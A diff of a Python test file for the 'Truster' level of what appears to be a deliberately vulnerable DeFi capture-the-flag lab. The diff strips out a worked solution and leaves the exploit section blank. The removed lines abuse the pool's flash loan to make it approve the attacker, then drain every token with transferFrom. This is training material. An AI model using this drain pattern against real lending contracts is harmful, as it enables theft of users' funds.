@@ -13,12 +13,7 @@ def test_truster():
     assert token.balanceOf(pool.address) == TOKENS_IN_POOL
     assert token.balanceOf(attacker.address) == 0
     # YOUR EXPLOIT GOES HERE
-    tokenBalanceOfPool = token.balanceOf(pool.address)
-    calldata = token.approve.encode_input(attacker.address, tokenBalanceOfPool)
-    pool.flashLoan(0, attacker.address, token.address, calldata, {"from": attacker})
-    token.transferFrom(
-        pool.address, attacker.address, tokenBalanceOfPool, {"from": attacker}
-    )
+
     # SUCCESS CONDITIONS
     assert token.balanceOf(attacker.address) == TOKENS_IN_POOL
     assert token.balanceOf(pool.address) == 0
